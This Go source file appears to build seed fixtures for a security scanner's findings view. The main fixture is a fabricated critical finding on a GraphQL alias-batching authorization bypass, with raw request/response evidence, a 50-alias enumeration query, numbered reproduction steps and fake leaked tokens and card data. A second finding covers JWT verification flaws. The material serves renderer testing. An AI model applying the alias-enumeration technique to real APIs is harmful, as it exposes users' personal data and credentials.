package cli

import (
	"fmt"
	"strings"
	"time"

	"github.com/vigolium/vigolium/pkg/database"
	"github.com/vigolium/vigolium/pkg/output"
)

// Long-form seed findings.
//
// Every other seed finding is deliberately small — one-line description, one
// short request/response pair — because they exist to populate a list. These
// two exist for the opposite reason: to be the worst case a renderer has to
// survive. Between them they carry multi-page descriptions, ~30 KB of raw
// request/response evidence, a thousand-line JSON body, lines long enough to
// need horizontal scrolling, minified single-line payloads, CJK text, and a
// dozen alternating request/response evidence pairs.
//
// The bulk bodies are GENERATED rather than pasted, so a 50-alias document and
// its 50-object reply stay internally consistent (and stay diff-able) without
// carrying 30 KB of string literal in source.

// bulkAliasCount is how many aliases the batched-GraphQL evidence carries. It
// is referenced by the query, the response, the Content-Length headers and the
// finding's own prose, so it lives in one place.
const bulkAliasCount = 50

// rawHTTP assembles a wire-form HTTP message from a header block written with
// plain LF line endings (so it stays readable as a raw string literal in
// source) and a body passed through verbatim.
func rawHTTP(head, body string) string {
	head = strings.ReplaceAll(strings.TrimSpace(head), "\n", "\r\n")
	if body == "" {
		return head + "\r\n\r\n"
	}
	return head + "\r\n\r\n" + body
}

// evidencePair joins a request and a response into one AdditionalEvidence
// entry using the separator the renderers split on.
func evidencePair(req, resp string) string {
	return req + output.EvidenceSeparator + resp
}

// seedIdentity is one deterministic, obviously-fake identity used by the bulk
// evidence generators.
type seedIdentity struct {
	ID     int
	Name   string
	Email  string
	Phone  string
	Role   string
	Token  string
	Stripe string
	Street string
	City   string
	Post   string
	Card   string
	Brand  string
}

var (
	seedGivenNames  = []string{"alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy"}
	seedFamilyNames = []string{"anderson", "bennett", "carver", "donnelly", "ellsworth", "fairbanks", "gutierrez", "halloran", "ibarra", "jankowski"}
	seedCities      = []string{"Springfield", "Ashcombe", "Brookhaven", "Cedar Falls", "Dunmore", "Eastport", "Fairview", "Glenwood", "Harborline", "Ivydale"}
	seedStreets     = []string{"Evergreen Terrace", "Baker Street", "Mulberry Lane", "Quarry Road", "Aldergrove Way", "Pinehurst Avenue", "Kingfisher Close", "Lowell Crescent", "Marchmont Row", "Northgate Parade"}
	seedCardBrands  = []string{"visa", "mastercard", "amex", "discover"}
)

// seedIdentityFor renders identity i. It is a pure function of i, so the same
// seed run produces the same bytes every time and a diff across runs is signal.
func seedIdentityFor(i int) seedIdentity {
	given := seedGivenNames[i%len(seedGivenNames)]
	family := seedFamilyNames[(i/len(seedGivenNames))%len(seedFamilyNames)]
	role := "customer"
	switch {
	case i == 1:
		role = "admin"
	case i == 2:
		role = "staff"
	case i%17 == 0:
		role = "support"
	}
	return seedIdentity{
		ID:     i,
		Name:   strings.ToUpper(given[:1]) + given[1:] + " " + strings.ToUpper(family[:1]) + family[1:],
		Email:  fmt.Sprintf("%s.%s@example.com", given, family),
		Phone:  fmt.Sprintf("+1-555-%04d", 100+i*7),
		Role:   role,
		Token:  "vgl_live_" + hashStr([]byte(fmt.Sprintf("seed-api-token-%d", i))),
		Stripe: "cus_" + hashStr([]byte(fmt.Sprintf("seed-stripe-%d", i)))[:14],
		Street: fmt.Sprintf("%d %s", 100+i*3, seedStreets[i%len(seedStreets)]),
		City:   seedCities[i%len(seedCities)],
		Post:   fmt.Sprintf("%05d", 10000+i*37),
		Card:   fmt.Sprintf("%04d", 4000+i*11),
		Brand:  seedCardBrands[i%len(seedCardBrands)],
	}
}

// buildBulkAliasQuery renders the batched GraphQL document. Each alias is one
// long line, which is what makes this useful for testing horizontal scrolling.
func buildBulkAliasQuery(n int) string {
	var b strings.Builder
	b.WriteString("query BulkEnumerate {\\n")
	for i := 1; i <= n; i++ {
		fmt.Fprintf(&b, "  u%d: user(id: %d) { id email phone role apiToken createdAt lastLoginAt failedLoginCount mfaEnabled billingAddress { line1 city postcode country } paymentMethods { id brand last4 expMonth expYear stripeCustomerId } orders(first: 5) { id total currency status placedAt internalNote } }\\n", i, i)
	}
	b.WriteString("}")
	return b.String()
}

// buildBulkAliasRequestBody wraps the document in the JSON envelope the
// endpoint expects. The document's newlines are JSON-escaped (\n), so the body
// is one very long line on the wire and a readable document once decoded —
// which is exactly the pair of shapes a viewer has to handle.
func buildBulkAliasRequestBody(n int) string {
	return fmt.Sprintf(`{"operationName":"BulkEnumerate","variables":{},"query":"%s"}`, buildBulkAliasQuery(n))
}

// buildBulkAliasResponseBody renders the reply as indented JSON: ~20 lines per
// identity, so 50 of them is a thousand-line body worth scrolling through.
func buildBulkAliasResponseBody(n int) string {
	var b strings.Builder
	b.WriteString("{\n  \"data\": {\n")
	for i := 1; i <= n; i++ {
		id := seedIdentityFor(i)
		fmt.Fprintf(&b, "    \"u%d\": {\n", i)
		fmt.Fprintf(&b, "      \"id\": \"%d\",\n", id.ID)
		fmt.Fprintf(&b, "      \"email\": \"%s\",\n", id.Email)
		fmt.Fprintf(&b, "      \"phone\": \"%s\",\n", id.Phone)
		fmt.Fprintf(&b, "      \"role\": \"%s\",\n", id.Role)
		fmt.Fprintf(&b, "      \"apiToken\": \"%s\",\n", id.Token)
		fmt.Fprintf(&b, "      \"createdAt\": \"2024-%02d-%02dT0%d:1%d:00Z\",\n", 1+i%12, 1+i%28, i%9, i%9)
		fmt.Fprintf(&b, "      \"lastLoginAt\": \"2026-09-%02dT%02d:%02d:11Z\",\n", 1+i%12, i%24, i%60)
		fmt.Fprintf(&b, "      \"failedLoginCount\": %d,\n", i%4)
		fmt.Fprintf(&b, "      \"mfaEnabled\": %t,\n", i%3 == 0)
		b.WriteString("      \"billingAddress\": {\n")
		fmt.Fprintf(&b, "        \"line1\": \"%s\",\n", id.Street)
		fmt.Fprintf(&b, "        \"city\": \"%s\",\n", id.City)
		fmt.Fprintf(&b, "        \"postcode\": \"%s\",\n", id.Post)
		b.WriteString("        \"country\": \"US\"\n      },\n")
		b.WriteString("      \"paymentMethods\": [\n        {\n")
		fmt.Fprintf(&b, "          \"id\": \"%d\",\n", 50+i)
		fmt.Fprintf(&b, "          \"brand\": \"%s\",\n", id.Brand)
		fmt.Fprintf(&b, "          \"last4\": \"%s\",\n", id.Card)
		fmt.Fprintf(&b, "          \"expMonth\": %d,\n", 1+i%12)
		fmt.Fprintf(&b, "          \"expYear\": %d,\n", 2027+i%4)
		fmt.Fprintf(&b, "          \"stripeCustomerId\": \"%s\"\n", id.Stripe)
		b.WriteString("        }\n      ],\n")
		b.WriteString("      \"orders\": [\n        {\n")
		fmt.Fprintf(&b, "          \"id\": \"%d\",\n", 90000+i)
		fmt.Fprintf(&b, "          \"total\": \"%d.%02d\",\n", 40+i*13, i%100)
		b.WriteString("          \"currency\": \"USD\",\n")
		fmt.Fprintf(&b, "          \"status\": \"%s\",\n", []string{"pending", "paid", "shipped", "refunded"}[i%4])
		fmt.Fprintf(&b, "          \"placedAt\": \"2026-08-%02dT%02d:%02d:00Z\",\n", 1+i%28, i%24, i%60)
		fmt.Fprintf(&b, "          \"internalNote\": \"flagged for manual fraud review by @ops-anna (case FR-2026-%04d)\"\n", 1000+i)
		b.WriteString("        }\n      ]\n")
		if i < n {
			b.WriteString("    },\n")
		} else {
			b.WriteString("    }\n")
		}
	}
	fmt.Fprintf(&b, "  },\n  \"extensions\": {\n    \"resolvedAliases\": %d,\n    \"deniedAliases\": 0,\n    \"complexityScore\": %d,\n    \"resolverTimeMs\": 1874,\n    \"traceId\": \"51a7c9e2-3b6d-42f0-ae19-6d0c7b53f8a4\"\n  }\n}", n, n*31)
	return b.String()
}

// seedLongFormFindings returns the oversized findings. findRec is the seed's
// own record lookup, passed in so the findings link to real HTTP records.
func seedLongFormFindings(now time.Time, findRec func(string) string) []*database.Finding {
	bulkReqBody := buildBulkAliasRequestBody(bulkAliasCount)
	bulkRespBody := buildBulkAliasResponseBody(bulkAliasCount)

	bulkRequest := rawHTTP(fmt.Sprintf(`POST /graphql HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,fr;q=0.8,de;q=0.7,ja;q=0.6
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzIiwicm9sZSI6ImN1c3RvbWVyIiwic2NvcGVzIjpbIm9yZGVyczpyZWFkIiwicHJvZmlsZTpyZWFkIl0sImlhdCI6MTc1NzYwMDAwMCwiZXhwIjoxNzU3NjAzNjAwLCJqdGkiOiJkM2YxYzhhMC05YjJlLTRkNTctODFhMy02ZTBmNGM3YjkxMjIifQ.ZmFrZS1zaWduYXR1cmUtZm9yLXNlZWQtZGF0YS1kby1ub3QtdXNl
Origin: https://example.com
Referer: https://example.com/account/preferences?tab=security&highlight=api-tokens&from=email-campaign-2026-09
X-Requested-With: XMLHttpRequest
X-Apollo-Operation-Name: BulkEnumerate
X-Client-Version: web-shell/8.14.2-canary.7+build.20260908.1142
Cookie: sid=S1E5S2I0O1N9F4A2K3E; csrftoken=8f1c0d2b4a6e9f31c5d7b8a0e2f4c6d8; locale=en-US; tz=America%%2FLos_Angeles; ab_bucket=checkout-v3-variant-b; consent=analytics:1,marketing:0,functional:1; _ga=GA1.2.1234567890.1757600000; _gid=GA1.2.9876543210.1757600000; feature_flags=graphql-batching%%3Aon%%2Cnew-nav%%3Aon%%2Clegacy-export%%3Aoff
Connection: keep-alive
Content-Length: %d`, len(bulkReqBody)), bulkReqBody)

	bulkResponse := rawHTTP(fmt.Sprintf(`HTTP/1.1 200 OK
Date: Fri, 12 Sep 2026 08:14:22 GMT
Content-Type: application/json; charset=utf-8
Content-Length: %d
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
Pragma: no-cache
Vary: Origin, Authorization, Accept-Encoding
Server: nginx/1.24.0
X-Request-Id: 0f3a9c71-6d2e-4b88-9a10-5c4e77b1d9aa
X-Resolver-Time-Ms: 1874
X-Alias-Count: %d
X-RateLimit-Limit: 600
X-RateLimit-Remaining: 594
X-RateLimit-Reset: 1757600400
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://cdn.example.com; connect-src 'self' https://api.example.com wss://ws.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'`,
		len(bulkRespBody), bulkAliasCount), bulkRespBody)

	return []*database.Finding{
		longFormGraphQLFinding(now, findRec, bulkRequest, bulkResponse),
		longFormAuditFinding(now, findRec),
	}
}

func longFormGraphQLFinding(now time.Time, findRec func(string) string, bulkRequest, bulkResponse string) *database.Finding {
	return &database.Finding{
		HTTPRecordUUIDs: []string{
			findRec("/graphql"),
			findRec("/api/v1/orders?status=pending"),
			findRec("/api/v1/users/me"),
			findRec("/api/v1/products/42"),
		},
		ModuleID:      "graphql-batch-idor",
		ModuleName:    "graphql",
		ModuleType:    database.ModuleTypeActive,
		ModuleShort:   "Detects object-level authorization bypass through batched GraphQL aliases",
		FindingSource: database.FindingSourceDynamicAssessment,
		Description:   longFindingDescription,
		Severity:      "critical",
		Confidence:    "certain",
		Tags: []string{
			"graphql", "idor", "bola", "authorization", "batching", "alias-abuse",
			"owasp-api1", "owasp-a1", "cwe-639", "data-exposure", "pii", "long-description",
		},
		Status:      database.StatusTriaged,
		Remediation: longFindingRemediation,
		CWEID:       "CWE-639",
		CVSSScore:   9.1,
		MatchedAt: []string{
			"https://example.com/graphql",
			"https://example.com/graphql#alias:u0",
			"https://example.com/graphql#alias:u1",
			"https://example.com/graphql#alias:u2",
			"https://example.com/graphql#operation:BulkEnumerate",
			"https://api.shop.local/api/v1/orders?status=pending&limit=10",
			"https://api.shop.local/api/v1/users/me",
		},
		ExtractedResults: []string{
			"user(id: 1) -> alice.anderson@example.com / +1-555-0107 / role=admin",
			"user(id: 2) -> bob.anderson@example.com / +1-555-0114 / role=staff",
			"user(id: 3) -> carol.anderson@example.com / +1-555-0121 / role=customer",
			"user(id: 7) -> grace.anderson@example.com / +1-555-0149 / role=customer",
			"user(id: 8) -> heidi.anderson@example.com / +1-555-0156 / role=customer",
			"order(id: 90001) -> total=53.01 USD, card_last4=4011, billing=103 Baker Street",
			"order(id: 90002) -> total=66.02 USD, card_last4=4022, billing=106 Mulberry Lane",
			"paymentMethod(id: 51) -> stripe_customer=cus_… , brand=mastercard, exp=02/2028",
			"apiToken(userId: 1) -> vgl_live_<32 hex chars, live credential>",
			"session(userId: 1) -> sid=S1E5S2I0O1N9F4A2K3E, expires=2026-12-31T23:59:59Z",
			"internalNote(orderId: 90001) -> \"flagged for manual fraud review by @ops-anna (case FR-2026-1001)\"",
			"auditLog(actorId: 1) -> 412 entries readable without the admin scope",
			"extensions.resolvedAliases = 50, extensions.deniedAliases = 0",
		},
		Request:            bulkRequest,
		Response:           bulkResponse,
		AdditionalEvidence: longFormGraphQLEvidence(bulkRequest, bulkResponse),
		FindingHash:        hashStr([]byte("graphql-batch-idor-example.com-/graphql-alias")),
		FoundAt:            now.Add(-52 * time.Minute),
		CreatedAt:          now.Add(-52 * time.Minute),
	}
}

func longFormGraphQLEvidence(bulkRequest, bulkResponse string) []string {
	smallQuery := func(doc string) string {
		body := fmt.Sprintf(`{"operationName":null,"variables":{},"query":"%s"}`, doc)
		return rawHTTP(fmt.Sprintf(`POST /graphql HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: application/json
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzIiwicm9sZSI6ImN1c3RvbWVyIn0.ZmFrZS1zaWduYXR1cmU
Origin: https://example.com
Cookie: sid=S1E5S2I0O1N9F4A2K3E; csrftoken=8f1c0d2b4a6e9f31c5d7b8a0e2f4c6d8
Content-Length: %d`, len(body)), body)
	}
	jsonResponse := func(reqID, body string, extraHeaders ...string) string {
		head := fmt.Sprintf(`HTTP/1.1 200 OK
Date: Fri, 12 Sep 2026 08:14:22 GMT
Content-Type: application/json; charset=utf-8
Content-Length: %d
Cache-Control: no-store
Vary: Origin, Authorization
Server: nginx/1.24.0
X-Request-Id: %s`, len(body), reqID)
		for _, h := range extraHeaders {
			head += "\n" + h
		}
		return rawHTTP(head, body)
	}

	return []string{
		// 1. Baseline: the same query for the caller's own id is allowed.
		evidencePair(
			smallQuery(`query { user(id: 3) { id email phone role apiToken } }`),
			jsonResponse("6b1d0f44-77cc-4a2e-8f61-2b9f0d3e5a10",
				`{"data":{"user":{"id":"3","email":"carol.anderson@example.com","phone":"+1-555-0121","role":"customer","apiToken":"vgl_live_c40d8fa16b2e47d9ae6310f5b7d2c084"}}}`),
		),
		// 2. Single out-of-scope id is correctly denied - this is the control.
		evidencePair(
			smallQuery(`query { user(id: 1) { id email phone role apiToken } }`),
			jsonResponse("9c22a5b0-1e4f-4d7a-b3c8-0a6e2f81cc37",
				`{"data":{"user":null},"errors":[{"message":"Not authorized to read User:1","path":["user"],"locations":[{"line":1,"column":9}],"extensions":{"code":"FORBIDDEN","policy":"owner-or-admin","subject":"User:3","object":"User:1","decisionId":"pol_7f3c1a90"}}]}`),
		),
		// 3. The bypass: aliasing the same field skips the per-field policy.
		evidencePair(
			smallQuery(`query Batch { u0: user(id: 3) { id email role } u1: user(id: 1) { id email role apiToken } u2: user(id: 2) { id email role apiToken } }`),
			jsonResponse("2d8e6f13-40ab-4c55-9e77-8811ab0c4d29",
				`{"data":{"u0":{"id":"3","email":"carol.anderson@example.com","role":"customer"},"u1":{"id":"1","email":"alice.anderson@example.com","role":"admin","apiToken":"vgl_live_9f2c41ab7de54c0a8e3b16d7c4f09a55"},"u2":{"id":"2","email":"bob.anderson@example.com","role":"staff","apiToken":"vgl_live_3b7e02cc9a1d48f6b5027e4fd8c11e63"}}}`,
				"X-Alias-Count: 3", "X-Resolver-Time-Ms: 142"),
		),
		// 4. Scale: the full 50-alias document and its thousand-line reply. This
		// is the same pair carried on Request/Response, repeated here so a
		// renderer that only walks AdditionalEvidence still meets the big body.
		evidencePair(bulkRequest, bulkResponse),
		// 5. Escalation: payment data reachable through the same shape.
		evidencePair(
			smallQuery(`query Pay { p0: paymentMethod(id: 55) { id brand last4 expMonth expYear stripeCustomerId billingAddress { line1 city postcode country } } o0: order(id: 90001) { id total currency status billingAddress internalNote lineItems { sku title quantity unitPrice } } }`),
			jsonResponse("c7e0b911-84d3-4a6c-91ff-33f2a7d6e5b8",
				`{"data":{"p0":{"id":"55","brand":"visa","last4":"4242","expMonth":4,"expYear":2029,"stripeCustomerId":"cus_Nx8QpLbT2aJ7vK","billingAddress":{"line1":"221B Baker Street","city":"London","postcode":"NW1 6XE","country":"GB"}},"o0":{"id":"90001","total":"1249.00","currency":"USD","status":"paid","billingAddress":"221B Baker Street, London NW1 6XE","internalNote":"flagged for manual fraud review by @ops-anna (case FR-2026-1001)","lineItems":[{"sku":"KBD-ERGO-88","title":"Ergonomic split keyboard, tenting kit included","quantity":1,"unitPrice":"189.00"},{"sku":"MON-32UHD-A","title":"32-inch 4K monitor, matte finish, USB-C 96W passthrough","quantity":2,"unitPrice":"530.00"}]}}}`),
		),
		// 6. The same weakness on the REST surface that fronts the resolver.
		evidencePair(
			rawHTTP(`GET /api/v1/orders?status=pending&limit=10&userId=1&include=billing,payment,notes&sort=-placed_at HTTP/1.1
Host: api.shop.local
Accept: application/json
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzIiwicm9sZSI6ImN1c3RvbWVyIn0.ZmFrZS1zaWduYXR1cmU
User-Agent: vigolium/0.4.6 (+https://vigolium.io)
X-Forwarded-For: 203.0.113.77
X-Request-Id: 8a2f0c31-77de-4b90-93aa-1f5c6e0b2d84`, ""),
			rawHTTP(`HTTP/1.1 200 OK
Date: Fri, 12 Sep 2026 08:15:03 GMT
Content-Type: application/json; charset=utf-8
X-Total-Count: 2
X-Request-Id: 8a2f0c31-77de-4b90-93aa-1f5c6e0b2d84
Cache-Control: private, max-age=0`,
				`{"orders":[{"id":90001,"userId":1,"total":"1249.00","currency":"USD","status":"pending","cardLast4":"4242","cardBrand":"visa","billingAddress":"221B Baker Street, London NW1 6XE","internalNote":"flagged for manual fraud review by @ops-anna (case FR-2026-1001)","placedAt":"2026-08-29T11:04:00Z"},{"id":90002,"userId":1,"total":"87.50","currency":"USD","status":"paid","cardLast4":"1881","cardBrand":"mastercard","billingAddress":"742 Evergreen Terrace, Springfield 49007","internalNote":"chargeback reversed 2026-08-14","placedAt":"2026-08-11T19:41:00Z"}],"total":2,"page":1,"perPage":10}`),
		),
		// 7. Introspection confirms the field policy is declared but unenforced.
		evidencePair(
			smallQuery(`query { __type(name: \"User\") { name fields { name description args { name type { name kind } } } } }`),
			jsonResponse("e91f3c05-2a77-4b1e-88d0-7c6a4b2e10f9",
				`{"data":{"__type":{"name":"User","fields":[{"name":"id","description":null,"args":[]},{"name":"email","description":"@auth(requires: OWNER_OR_ADMIN)","args":[]},{"name":"phone","description":"@auth(requires: OWNER_OR_ADMIN)","args":[]},{"name":"apiToken","description":"@auth(requires: SELF) - rotating this invalidates all active sessions","args":[]},{"name":"role","description":null,"args":[]},{"name":"billingAddress","description":"@auth(requires: OWNER_OR_ADMIN)","args":[]},{"name":"paymentMethods","description":"@auth(requires: OWNER_OR_ADMIN)","args":[]},{"name":"orders","description":"@auth(requires: OWNER_OR_ADMIN)","args":[{"name":"first","type":{"name":"Int","kind":"SCALAR"}},{"name":"after","type":{"name":"String","kind":"SCALAR"}}]}]}}}`),
		),
		// 8. Failure mode: a malformed alias leaks the resolver stack trace.
		evidencePair(
			smallQuery(`query { u0: user(id: \"not-a-number\") { id email } }`),
			rawHTTP(`HTTP/1.1 500 Internal Server Error
Date: Fri, 12 Sep 2026 08:15:44 GMT
Content-Type: application/json; charset=utf-8
X-Request-Id: 44b8d2e7-90a1-4f3c-b6e5-1d7c08a9f223
Connection: close`,
				`{"errors":[{"message":"invalid input syntax for type integer: \"not-a-number\"","extensions":{"code":"INTERNAL_SERVER_ERROR","exception":{"name":"QueryFailedError","query":"SELECT \"User\".\"id\", \"User\".\"email\", \"User\".\"phone\", \"User\".\"role\", \"User\".\"api_token\" FROM \"users\" \"User\" WHERE \"User\".\"id\" = $1 LIMIT 1","parameters":["not-a-number"]},"stacktrace":["QueryFailedError: invalid input syntax for type integer: \"not-a-number\"","    at PostgresQueryRunner.query (/srv/app/node_modules/typeorm/driver/postgres/PostgresQueryRunner.js:219:19)","    at processTicksAndRejections (node:internal/process/task_queues:95:5)","    at SelectQueryBuilder.loadRawResults (/srv/app/node_modules/typeorm/query-builder/SelectQueryBuilder.js:2028:25)","    at SelectQueryBuilder.executeEntitiesAndRawResults (/srv/app/node_modules/typeorm/query-builder/SelectQueryBuilder.js:1836:26)","    at UserResolver.user (/srv/app/dist/resolvers/user.resolver.js:88:22)","    at field.resolve (/srv/app/node_modules/graphql/execution/execute.js:492:18)","    at executeField (/srv/app/dist/server.js:141:9)","    at /srv/app/dist/server.js:180:24","    at Array.map (<anonymous>)","    at executeFields (/srv/app/dist/server.js:178:31)"]}}],"data":null}`),
		),
		// 9. Unicode / wide-character body, to exercise renderer column math.
		evidencePair(
			smallQuery(`query { u0: user(id: 9) { id displayName addressLine notes } }`),
			jsonResponse("f30c8b17-5d92-4e61-a7b3-9c4180de2f66",
				`{"data":{"u0":{"id":"9","displayName":"山田 太郎","addressLine":"東京都渋谷区神南 1-2-3 グランドビル 12階","notes":"支払い方法の変更を依頼されました。本人確認未完了 — フラグ立て済み (FR-2026-1009)"}}}`),
		),
		// 10. A minified bundle fragment: one enormous line, no newline to wrap
		// on, which is the case that breaks naive viewers.
		evidencePair(
			rawHTTP(`GET /assets/app.9f2c41ab.js HTTP/1.1
Host: example.com
Accept: */*
Referer: https://example.com/account/preferences`, ""),
			rawHTTP(`HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: public, max-age=31536000, immutable
ETag: "9f2c41ab7de54c0a"`,
				`!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?t(exports):"function"==typeof define&&define.amd?define(["exports"],t):t((e="undefined"!=typeof globalThis?globalThis:e||self).AppShell={})}(this,function(e){"use strict";var t={endpoint:"/graphql",batching:!0,batchMax:50,batchIntervalMs:10,persistedQueries:!1,credentials:"include",headers:{"x-apollo-operation-name":"","x-client-version":"web-shell/8.14.2-canary.7+build.20260908.1142"}};function n(e,n){var r=e.map(function(e,t){return"u"+t+": "+e.field+"("+Object.keys(e.args).map(function(t){return t+": "+JSON.stringify(e.args[t])}).join(", ")+") { "+e.selection+" }"}).join(" ");return fetch(t.endpoint,{method:"POST",credentials:t.credentials,headers:Object.assign({"content-type":"application/json"},t.headers,n||{}),body:JSON.stringify({operationName:"BulkEnumerate",variables:{},query:"query BulkEnumerate { "+r+" }"})}).then(function(e){return e.json()})}e.batchQuery=n,e.config=t,Object.defineProperty(e,"__esModule",{value:!0})});`),
		),
	}
}

func longFormAuditFinding(now time.Time, findRec func(string) string) *database.Finding {
	return &database.Finding{
		HTTPRecordUUIDs: []string{findRec("/api/v1/auth/login")},
		AgenticScanUUID: "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
		URL:             "https://api.shop.local/api/v1/auth/login",
		Hostname:        "api.shop.local",
		ModuleID:        "audit-jwt-trust-chain",
		ModuleName:      "Vigolium Audit",
		ModuleType:      database.ModuleTypeAgent,
		ModuleShort:     "Source audit of the token issuing and verification chain",
		FindingSource:   database.FindingSourceAudit,
		Description:     longAuditDescription,
		Severity:        "high",
		Confidence:      "firm",
		Tags: []string{
			"audit", "jwt", "authentication", "algorithm-confusion", "key-management",
			"cwe-347", "source-analysis", "long-description",
		},
		Status:      database.StatusDraft,
		Remediation: longAuditRemediation,
		CWEID:       "CWE-347",
		CVSSScore:   8.1,
		SourceFile:  "/opt/repos/shop-api/app/auth/jwt.py:31",
		RepoName:    "shop-api",
		MatchedAt: []string{
			"/opt/repos/shop-api/app/auth/jwt.py:31",
			"/opt/repos/shop-api/app/auth/jwt.py:58",
			"/opt/repos/shop-api/app/auth/middleware.py:22",
			"/opt/repos/shop-api/app/config.py:14",
			"/opt/repos/shop-api/tests/test_auth.py:77",
		},
		ExtractedResults: []string{
			"jwt.decode(token, key, algorithms=header[\"alg\"])",
			"SECRET_KEY = os.getenv(\"JWT_SECRET\", \"change-me\")",
			"verify_exp defaulted to False in the middleware path",
			"no audience (aud) or issuer (iss) claim is checked",
			"the same secret signs access tokens, refresh tokens and password-reset tokens",
		},
		Request:            longAuditRequest,
		Response:           longAuditResponse,
		AdditionalEvidence: longFormAuditEvidence(),
		FindingHash:        hashStr([]byte("audit-jwt-trust-chain-shop-api-jwt.py-31")),
		FoundAt:            now.Add(-47 * time.Minute),
		CreatedAt:          now.Add(-47 * time.Minute),
	}
}

func longFormAuditEvidence() []string {
	return []string{
		"Source: app/auth/jwt.py (complete file, 74 lines)" + output.EvidenceSeparator + longAuditSourceJWT,
		"Source: app/auth/middleware.py:1-48" + output.EvidenceSeparator + longAuditSourceMiddleware,
		"Source: app/config.py:1-32" + output.EvidenceSeparator + longAuditSourceConfig,
		evidencePair(longAuditRequest, longAuditResponse),
		evidencePair(longAuditForgedRequest, longAuditForgedResponse),
		"Test that documents the behaviour as intended" + output.EvidenceSeparator + longAuditSourceTest,
	}
}

// ---------------------------------------------------------------------------
// Long-form bodies
// ---------------------------------------------------------------------------

// longFindingDescription is a deliberately oversized, multi-paragraph finding
// body. It exists so renderers and downstream consumers can be tested against
// a description that wraps, contains lists, indented code, and long unbroken
// tokens, rather than the one-line descriptions the other seeds carry.
const longFindingDescription = `Object-level authorization on the GraphQL endpoint is evaluated once per operation rather than once per resolved field, so a caller can read any other user's record - including fields explicitly marked @auth(requires: OWNER_OR_ADMIN) - simply by requesting the same field twice under different aliases in a single document.

WHAT THE SERVER DOES

The user(id:) resolver calls assertOwnerOrAdmin() and then latches the result on the per-request context (ctx.policyChecked). GraphQL executes every alias of a field as a separate resolver invocation against that same context, so the first alias pays for the authorization decision and every subsequent alias inherits it. When the first alias names the caller's own id the decision is "allow", and that allow is then reused for every other id in the document.

The practical consequence is that the API's entire user table, its orders, its stored payment methods and its long-lived API tokens are readable by any authenticated customer. There is no rate limit on document size, no alias-count cap, and no query-complexity budget: a single request resolved 50 aliases in 1.87 seconds with zero denials, which makes full-table extraction a matter of a few hundred requests rather than a few hundred thousand.

WHY THE CONTROL LOOKS PRESENT BUT IS NOT

This is a particularly easy weakness to miss in review because every artifact that a reviewer would check reports the control as present:

  - The schema declares the directive. Introspection returns "@auth(requires: OWNER_OR_ADMIN)" in the description of both the email and phone fields.
  - The negative test passes. Requesting user(id: 1) as customer 3 in a single-field document returns data:null with a FORBIDDEN error, which is exactly what the test suite asserts.
  - The audit log records a policy evaluation for the request, so log-based monitoring shows an authorization check happening on every call.

None of those observations are wrong. They are all describing the first alias. The bypass lives entirely in the second one, and nothing in the schema, the test suite or the logs distinguishes a one-alias document from a fifty-alias one.

REPRODUCTION

  1. Authenticate as any low-privilege customer and keep the bearer token. The account used for this finding was id 3 (carol.anderson@example.com, role=customer).
  2. Send a single-field document for another user's id and confirm it is denied - this is the control, and it must fail before the bypass is meaningful.
  3. Send one document containing two aliases of the same field, the first naming your own id and the second naming the victim's:

         query Batch {
           u0: user(id: 3) { id email phone role apiToken }
           u1: user(id: 1) { id email phone role apiToken }
         }

  4. Observe that u1 resolves with full field selection. Expand the document with additional aliases (u2, u3, ... uN) to enumerate.
  5. The same shape reaches order(id:), paymentMethod(id:) and auditLog(actorId:), because all three resolvers latch on the same ctx.policyChecked flag.

BLAST RADIUS

Confirmed readable across the sample of ids probed during this scan: email addresses, telephone numbers, role assignments, live API tokens (prefix vgl_live_), Stripe customer identifiers, card brand and last four digits, full billing addresses, and free-text internal fraud-review notes naming individual staff members. The admin account's token was among them, which converts this from a data-exposure issue into a straightforward privilege escalation: the recovered token carries admin:settings and users:write.

The token values recovered here are live credentials, not identifiers. Treat this finding as a credential-compromise event as well as an authorization defect - rotating the exposed tokens is part of remediation, not a follow-up to it.

NOTES ON CONFIDENCE

Confidence is certain rather than firm: the bypass was demonstrated end to end against a control request in the same session with the same token, the recovered field values are internally consistent across the REST surface and the GraphQL surface, and the resolver source recovered from the deployed bundle shows the latching behaviour directly. No inference was required at any step.`

// longFindingRemediation pairs with longFindingDescription.
const longFindingRemediation = `Move the authorization decision from the operation to the field, and stop caching it on the request context.

  1. Delete the ctx.policyChecked latch in dist/resolvers/user.resolver.js and call assertOwnerOrAdmin(ctx, id) unconditionally on every invocation. The check is a single indexed lookup; caching it is not worth what it costs here.
  2. Enforce the @auth directive in the schema layer rather than in hand-written resolver bodies, so a new resolver cannot be added without one. A directive-based visitor (graphql-shield, or a custom SchemaDirectiveVisitor) applies per field resolution by construction.
  3. Add an alias-count and query-complexity budget to the executor, and reject documents that exceed it. This does not fix the authorization defect but it bounds the extraction rate of the next one.
  4. Rotate every credential recoverable through this path: all vgl_live_ API tokens, the session identifiers observed, and any Stripe customer references treated as secret. Assume the full set was read.
  5. Add a regression test that asserts a two-alias document is denied on the second alias. A single-field negative test passes against the vulnerable code and will not catch a recurrence.`

// longAuditDescription is the source-audit counterpart to
// longFindingDescription - long-form prose anchored at source locations.
